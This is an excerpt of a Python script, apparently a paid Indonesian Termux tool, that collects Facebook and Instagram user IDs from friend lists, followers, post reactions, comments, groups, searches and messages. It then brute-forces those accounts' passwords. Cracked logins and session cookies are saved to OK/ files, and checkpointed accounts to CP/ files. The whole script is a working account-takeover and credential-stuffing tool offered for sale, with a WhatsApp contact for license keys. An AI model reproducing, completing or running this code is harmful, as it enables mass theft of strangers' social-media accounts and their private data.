...
sys.stdout.write('\x1b[1;35m\x1b]2; {×} Crack by Ncek {×} \x07')
...
def banner():
	os.system('clear')
	logo = (f'# • {author} •')
	play = rich.markdown.Markdown(logo, style='blue')
	rich.console.Console().print(play)
	au = ' ____                 _             •> Author :NCEK-XD                                / ___| _ __ __ _  ___| | _____ _ __ •> Github :Ncek-XD                             | |   | `__/ _` |/ __| |/ / _ \ `__|•> Status :PREMIUM                              | |___| | | (_| | (__|   <  __/ |                                        \____ |_|  \__,_|\___|_|\_\___|_|  V.1.0'  
	wel = nel(au,style="blue")
	cetak(nel(wel))
...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		ab = '[01] Login Instagram Via Cookie                          [02] Login Efbih Via Cookie                                   [03] Tutorial mendapatkan cookie                       [00] Exit'
		ac = nel(ab, style='blue')
		cetak(nel(ac, title='LOGIN'))
		while True:
...
class Menu():
	...
	def tentang(self):
		try:
			...
			os.system("  data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python cracks-dec.py')
		try:
		...
		if "mbasic_logout_button" not in a:
			...
			banner()
			print(f"{U} [+] {O}Name{M} : {M}{tentang.get('nama')}\n")
			aj = '[01] Crack dari daftar teman\n[02] Crack pengikut\n[03] Crack React Post\n[04] Crack dari komentar\n[05] Crack anggota grup\n[06] Crack pencarian nama\n[07] Crack dari Pesan\n[08] Crack dari saran friend\n[09] Crack IGEH PRO\n[10] Lihat Hasil\n[11] Cek opsi akun checkpoint\n[12] Hapus Cookie\n[00] Keluar'
			ah = nel(aj, style='blue')
			cetak(nel(ah, title='MENU'))
...
class pilihan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			ap = '# CRACK DAFTAR TEMAN'
			ak = mark(ap, style='white')
			sol().print(ak)
			gan = input ("\n%s%s%s crack massal ? y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s isi yang bener kntd'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
					token = self.token
				...
				ko = '# Pastikan daftar teman yang bersifat publik cok'
				ki = mark(ko,style="white")
				sol().print(ki)
			...
			po = '	 Pastikan target memiliki pengikut cok'
			op = nel(po,style='white')
			cetak(nel(op, title="CRACK DARI PENGIKUT"))
			idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			else:
			...
			po = '	 Pastikan postingan bersifat publik cok'
			op = nel(po,style='white')
			cetak(nel(op, title="CRACK DARI POSTINGAN"))
			...
			po = '	 Pastikan postingan bersifat publik cok'
			op = nel(po,style='white')
			cetak(nel(op, title="CRACK DARI KOMENTAR"))
			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
				self.menu()
			...
			ei = '# Crack Dari Member Group'
			et =mark(ei,style='white')
			sol().print(et)
			while True:
				print ("\n%s%s %sPastikan group bersifat publik  "%(U,til,B))
			...
			ey = '# Crack Dari Pencarian Orang'
			et =mark(ey,style='white')
			sol().print(et)
			while True:
				print ("\n%s%s %sMasukan nama orang contoh Ncek XD "%(U,til,O))
			...
			uy = '# Crack Dari Pesan'
			ui =mark(uy,style='white')
			sol().print(ui)
			print('')
			self.pesan('https://mbasic.facebook.com/messages')
		elif slut in["8","08"]:
			io = '# Crack dari saran teman'
			iu =mark(io,style='white')
			sol().print(iu)
			try:
			...
			ju = '[01] Lihat hasil akun facebook\n[02] Lihat hasil akun igeh\n[03] Hapus hasil\n[00] Kembali'
			ja = nel(ju,style='blue')
			cetak(nel(ja, title='HASIL AKUN'))
			rom = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['11']:
			file_cp()
		elif slut in['12']:
			tu = '# Mengahapus Cookie•'
			ta =mark(tu,style='red')
			sol().print(ta)
			try:
				...
				if pwx == '':
					...
					def manual(brute=None):
						...
						if ind =='':
							...
							manual()
					pr = '# pilih methode login, silahkan coba satu²'
					ur = mark(pr, style="blue")
					sol().print(ur)
					ui = '-> 1. Free (fast rawan spam)\n-> 2. Mbasic (slow recomended)\n-> 3. Mobile (slow kaya keong)'
					uy = nel(ui,style="blue")
					sol().print(uy)
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			...
			for pw in manual:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[OK] %s ◊ %s ◊ %s %s %s\n Cookies-> %s '%(H,user,pw,day,month,year,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [OK] %s ◊ %s ◊ %s %s %s\n Cookies-> %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
			...
			for pw in manual:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						pass
					print ('\r %s[OK] %s ◊ %s \n Cookies-> %s '%(H,user,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [OK] %s ◊ %s\n Cookies-> %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						...
						os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [CP] %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		...
		if len(cp)==0:
			...
			c = input('\n%s%s%s cek opsi checkpoint? y/t%s > %s'%(U,til,H,M,K))
			if c =='':
				exit("%s%s Isi yang benar kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Nyalakan mode pesawat 2 detik "%(U,O))
		...
		exit(f"\n{M}{til} Ops... kasian ga dapet wokwok :(")
...
def cek_apk(kukis):
	...
	try:
		for i in range(len(game)):
			print ("\r%s[Non-Aktif]-->%s%s%s%s"%(M,P,[i+1],M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
...
def file_cp():
	dirs = os.listdir('CP')
	hu = '# Masukan Nama file [cth: 25-Maret-2022.txt'
	hi = mark(hu,style='white')
	cetak(nel(hi, title='Pilih Hasil Crack'))
	for file in dirs:
	...
	while True:
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			...
			if key in check.text:
				...
				pr = '# SILAHKAN BELI KEY KE WA 083832629797'
				pu = mark(pr, style='red')
				cetak(nel(pu, title=" KEY ANDA BELUM DI KONFIRMASI"))
				os.system('xdg-open http://wa.me/+6283832629797')
